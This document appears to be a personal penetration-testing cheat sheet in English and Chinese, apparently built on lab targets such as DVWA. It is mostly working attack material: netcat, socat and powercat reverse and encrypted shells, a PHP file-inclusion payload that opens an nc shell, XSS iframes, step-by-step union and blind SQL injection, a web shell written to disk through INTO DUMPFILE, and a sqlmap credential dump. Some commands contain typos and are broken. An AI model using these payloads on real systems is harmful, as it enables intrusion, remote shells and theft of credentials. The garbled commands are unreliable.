
netcat
    nc -nvlp 2233 -e /bin/bash   #the ccontroller
        shell

    nc -nv IP 2233 -e /bin/bash   #for controlled host
        nc -nvlp 2233 # the ccontroller listening to wait the shell(reverse shell)
    
    python -c "import pty; pty.spawn ('/bin/bash')"  
     python3 -c "import pty; pty.spawn ('/bin/bash')"  # to change for a better shell

	c 192.168.1.110 2233 | /bin/bash | nc 192.168.1.110 8000
		# if nc on target host does not support -e /bin/bash, transfer the result to an additional port on the source host.



**********************************************************************

socat

    socat TCP4-LISTEN:2233 -   #host listioning on a port
    socat - tcp:192.168.1.132:2233  # to connect the host

    sudo socat TCP4-LISTEN:2233,fork file:test.sh # to share a specific file
        socat - tcp:192.168.1.132:2233 # to sidplay the content of the  file
            socat TCP:192.168.1.132:2233 file:new.file,create  #to get the file


    socat -d -d TCP4-LISTEN:2233 -     #reverse shell on controlled host
        socat TCP4:192.168.1.134:2233 EXEC:/bin/bash    #to connect the reverse shell

    sudo socat OPENSSL-LISTEN:2233,cert=shell.pem,verify=0,fork EXEC:/bin/bash #encrypted shell
        socat - OPENSSL:192.168.1.134:2233,verify=0  #to connect


**********************************************************************
powercat # nc on win

    for linux listening
        nc -nvlp 2233

        powershell -c IP -p 

    #transmission of files
        sudo nc -nvlp > nameoffile.xx
        #on win 
            powercat -c IP -p -i C:\xxx.xx

    # shell
         sudo nc -nvlp > nameoffile.xx
        #on win 
            powercat -c IP -p -e cmd.EXEC

    # reverseshell 
        sudo nc -nvlp 2233 #controller
            powercat -c IP -p xx -e powershell.exe(or cmd.exe) -g nameofscript.ps1

  # enable a http server  
sudo python3 -m http.server 2233

**********************************************************************

dict  # snap install seclists
    /snap/seclists/discovery


**********************************************************************
nmap -sn 172.16.33.0/24        #scanning for live machine

nmap -p- 172.16.3XX --open --reason  #scanning for live ports for a particular machine

sudo nmap -p ****  -sV -A 172.16      # investigate the app of ports.



    web
        robots.txt
        sitemap.xml
        F12 前端代码，注释，脚本，路径，隐藏元素，CMS， Copyright Wordpress

        direcroty discovery
            dirsearch -u http://xxx
 
            kali dicts
                dirsearch -u http://xxx -w /usr/share/seclists/Discovery/Webcontent
            dir disco hidden files
                dirsearch -u http://xxx -e -f txt,php,html
    
    vuls searching
        searchsploit xxx  # for a app or software middleware named XXX


    rbash across
        ssh xx@xxxxx "export TERM=xterm; python -c 'import pty; pty.spawn(\"/bin/bash\")'"
        ssh mindy@172.16.33.35  -t "bash --noprofile"


    exp exploit
        payload = 'nc  IP  2233 -e /bin/bash'

            
    #brute force zip
        zip2john xx.zip > xx.hash     # to get the hash of the passwd
        john xx.hash    # to brute the plaintext passw



web
    CN encode: url encode
    #后台地址  Tomcat   /manager/html
              phpMyadmin
    
    wpscan --url xxx                    #to exploit /wordpress directory

    hakrawler  # search for the web direc

    crAPI   #webAPi  tool

    ssh -CNfg -L 80:127.0.0.1:8000  ed@IP   #80 dest port, 8000 the port to be forwarded
                                            to map 127.0.0.1:8000 to 80

    xss
        <iframe src="http://IP" height="30" width="40"> </iframe> #height and width can be set as 0

        <iframe src="http://192.168.1.140" height="30" width="40"> </iframe>

file inclusion
    data:text/plain,<?php%20$var=shell_exec($_GET[%27cmd%27]);%20echo%20$var%20?>&cmd=/bin/nc* 

	ncat -nv 192.168.65.129  2233 -e /bin/bash  /proc/version

           # get the info of the machine
                etc/passwd etc/os-release

    php5.X %00 will cut the afterward econtent.   

Spli  --input parameter is char 
    ' or 1=1 limit 1;#
	1' or 1=1 limit 3,1  ;#    #3 is the index of the result got from the DB

	injection
		1' order by 3#     #order by    is used to identify the nums of columns of the sheet. if the respnse of 3 is error,
									the colume is less than 3.
		union select 1,2#    # 1 and 2 can be functions to enquery info. 
					like version(), database()(scheam_name),user(), table_name,  table_chema, @@hostname. 内建函数， global var.
						from information_schema.tables ,
		#to get the tables of the DB 
			1' union select table_name,1 from information_schema.tables#
		# table name of dvwa schema
			1' union select table_name,1 from information_schema.tables where table_schema='dvwa'#
		
		colume of the schema#
			1' union select column_name,1 from information_schema.columns where table_schema='dvwa' and table_name='users'#
		# toe get the content of a table of a particular schema 
			1' union select user,password from dvwa.users#
			# crack station to find the collision of hash of the passwd
		# load a file on the host
			union select null,load_file('/etc/passwd')#
		# write a sh on the host
			union select null,:<?php $var=shell_ecec($GET['cmd']): echo $var ?> INTO DUMPFILE '/var/www/html/shell.php'#
	--input parameter is int  #burp repeatrer is used to modify the post body content
		# to get the schema and table from information_schema.tables
			id=1 union select table_schema,table_name from information_schema.tables#&Submit=Submit
		# to get schema name--table_schema from a particular schema 
			id=1 union select table_name,2 from information_schema.tables where table_schema=database()#&Submit=Submit # ' will be interpreted by the server,
			id=1 union select table_name,2 from information_schema.tables where table_schema=0x64767761#&Submit=Submit  # 0x dvwa
		# to get the column_name
			id=1 union select column_name,2 from information_schema.columns where table_schema=0x64767761 and table_name=0x7573657273#&Submit=Submit
		# to get the content of a table
			id=1 union select user,password from dvwa.users#&Submit=Submit
sqli bind # only got true or false result, so use 'and ' or 'or'. so transfer the select result to binary format of ASCII string, tell the bit 1 by 1
	1 and substring(bin(ASCII(substring(database(),1,1))),1,1)>0#         #change the last second num to move the index of ASCII string/

	1' union select substring(table_name,1,1),null from information_schema.tables where table_schema='dvwa'# to get the table_name

	1' union select substring((bin(ascii(substring(user,1,1))),null from dvwa.users limit 2,1#),1,1)  # last try
	
	4.猜列名

就直接拿 users表为例了。

先猜表中的字段数目1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=8 #   （中间步骤省略了） 数目为 8

猜user表各个名称，按照常规流程，从users表的第1个字段开始，对其猜解每一个组成字符，获取到完整的第1个字段名称...然后是第2/3/.../8个字段名称。当字段数目较多、名称较长的时候，若依然按照以上方式手工猜解，则会耗费比较多的时间。当时间有限的情况下，实际上有的字段可能并不太需要获取，字段的位置也暂且不作太多关注，首先获取几个包含键信息的字段，如：用户名、密码...

 

 

【猜想】数据库中可能保存的字段名称
用户名：username/user_name/uname/u_name/user/name/...
密码：password/pass_word/pwd/pass/...

所以说我们的命令就可以是 1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' and column_name='user')=1 #，输出exists

 1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' and column_name='password')=1 #，输出exists

所以我们可以知道 users表中有 user和password。还可以试试别的

 

5.猜表中的字段值

同样使用二分法来做，直接写最后一步了：

用户名的字段值：1' and length(substr((select user from users limit 0,1),1))=5 #，输出exists

——说明user字段中第1个字段值的字符长度=5。

密码的字段值：1' and length(substr((select password from users limit 0,1),1))=32 #，

——说明password字段中第1个字段值的字符长度=32（基本上这么长的密码位数可能是用md5的加密方式保存的）

然后再使用二分法猜解user字段的值：（用户名）

1' and ascii(substr((select user from users limit 0,1),1,1))=xxx #（第一个字符）

1' and ascii(substr((select user from users limit 0,1),2,1))=xxx #（第二个字符）                                            

。。。。。

猜解password字段的值：（密码）

1' and ascii(substr((select password from users limit 0,1),1,1))=xxx #（第一个字符）

	sqlmap
		sqlmap -u "http://192.168.0.104/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=sgefsbodcapjoirl8f3t731435" -p id -D dvwa -T users --dump
			-p schema_name, -T table_name, --dump
			--schames --tables --columns



		
